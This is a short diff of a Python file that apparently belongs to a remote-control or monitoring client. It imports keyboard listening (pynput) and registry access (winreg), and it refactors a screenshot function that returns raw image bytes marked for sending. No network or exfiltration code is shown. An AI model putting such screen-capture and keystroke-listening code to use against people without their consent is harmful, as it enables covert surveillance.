@@ -1,5 +1,4 @@
 import psutil
-import pyautogui
 from PIL import ImageGrab
 import numpy as np
 import os
@@ -7,8 +6,6 @@ from pynput.keyboard import Listener, Key
 import subprocess
 import winreg
 import os
-import pyautogui
-import subprocess
 
 def get_hkey(HKEY_NAME):
     if HKEY_NAME == 'HKEY_LOCAL_MACHINE':
@@ -65,10 +62,11 @@ def open_process(name):
 def take_screen_shot():
     img = ImageGrab.grab(bbox = None)
 
-    photo_to_send = img.tobytes()
-    size = len(photo_to_send)
+    width, height = img.size
 
-    width, height = pyautogui.size()
+    photo_to_send = img.tobytes()
+    
+    size = len(photo_to_send)
     
     return photo_to_send, size, width, height
 
